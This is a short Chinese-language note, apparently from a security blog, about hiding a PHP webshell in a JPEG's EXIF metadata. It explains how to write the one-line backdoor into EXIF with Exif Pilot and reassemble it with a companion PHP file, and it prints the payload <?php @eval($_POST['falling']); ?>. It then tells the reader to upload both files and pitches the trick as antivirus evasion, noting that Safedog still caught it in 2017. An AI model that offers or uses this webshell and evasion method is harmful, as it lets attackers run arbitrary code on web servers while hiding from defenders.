1、什么是EXIF

Exif就是在JPEG格式头部插入了数码照片的信息，包括拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及GPS全球定位系统数据、缩略图等。
ctf的某些图像隐写术题，就会把flag藏在exif里面
php中用函数exifreaddata可以读取jpeg的exif信息

2、利用
使用工具exif pilot，将一句话信息放入到jpg exif中，然后使用相应的php文件读取jpg文件的exif组成一句话木马
效果相当于<?php @eval($_POST['falling']); ?>

3、注意
exif.jpg和exif.php文件需要同时上传到服务器中

4、好处，免杀
2017-4-25进行测试发现，安全狗可以查杀改一句话